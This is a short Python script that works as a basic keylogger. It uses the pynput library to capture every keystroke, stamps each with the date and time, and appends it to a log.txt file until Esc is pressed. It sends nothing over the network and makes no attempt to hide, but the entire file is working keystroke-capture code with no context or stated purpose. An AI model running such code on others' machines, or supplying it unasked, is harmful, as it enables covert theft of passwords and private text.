from pynput.keyboard import Key, Listener
import os
import datetime


count = 0
update_log = 1
keys = []


def check_log_exist(log_file_name):
    with open(log_file_name, "w") as f:
        f.write("")


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= update_log:
        count = 0
        write_log(keys)
        keys = []


def write_log(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            current_time = datetime.datetime.now()
            str_time = current_time.strftime("%d/%m/%Y, %H:%M:%S").ljust(40)
            f.write(f"Time pressed: {str_time} key: {k}\n")


def on_release(key):
    if key == Key.esc:
        return False


def main():
    path = os.getcwd()
    check_log_exist(f"{path}\log.txt")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
